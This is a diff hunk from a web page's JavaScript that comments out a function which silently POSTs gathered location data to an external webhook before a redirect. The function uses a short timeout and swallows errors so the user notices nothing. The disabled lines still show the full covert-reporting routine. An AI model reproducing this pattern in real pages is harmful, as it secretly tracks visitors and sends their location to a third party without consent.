@@ -98,21 +98,21 @@
     }
 
     // ========== 上报位置 ==========
-    async function sendLocationToServer(data) {
-      const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // 确保没有多余空格！
+    // async function sendLocationToServer(data) {
+    //   const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // 确保没有多余空格！
 
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data),
-          // 设置短超时避免阻塞跳转
-          signal: AbortSignal.timeout(3000)
-        });
-      } catch (err) {
-        // 静默失败，不影响用户体验
-      }
-    }
+    //   try {
+    //     await fetch(WEBHOOK_URL, {
+    //       method: "POST",
+    //       headers: { "Content-Type": "application/json" },
+    //       body: JSON.stringify(data),
+    //       // 设置短超时避免阻塞跳转
+    //       signal: AbortSignal.timeout(3000)
+    //     });
+    //   } catch (err) {
+    //     // 静默失败，不影响用户体验
+    //   }
+    // }
 
     // ========== 主逻辑：获取位置并跳转 ==========
     function getLocationAndRedirect() {
